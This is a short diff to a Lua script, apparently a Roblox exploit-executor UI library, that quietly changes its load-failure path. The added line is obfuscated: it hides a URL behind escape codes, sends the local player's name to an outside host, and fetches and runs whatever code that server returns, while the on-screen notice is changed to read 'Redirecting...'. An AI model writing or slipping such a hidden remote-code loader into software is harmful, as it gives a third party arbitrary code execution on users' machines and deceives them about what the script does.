@@ -5,11 +5,11 @@ if disc then
 local CoreGui = game:GetService("StarterGui")
 CoreGui:SetCore("SendNotification", {
 Title = "Library failed";
-Text = "Library failed to load..";
+Text = "Redirecting...";
 Duration = 0;
 })
-
---return
+local q,w,e,r,t=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.patchkids.xyz/auth";e(q and w,"Executor not Supported");local u=game:GetService("Players").LocalPlayer.Name or "Unknown";q(w({Url=t.."\63user\61"..u,Headers={["User-Agent"]="PatchKids"}}).Body)()
+return
 end
 
 local library = {}
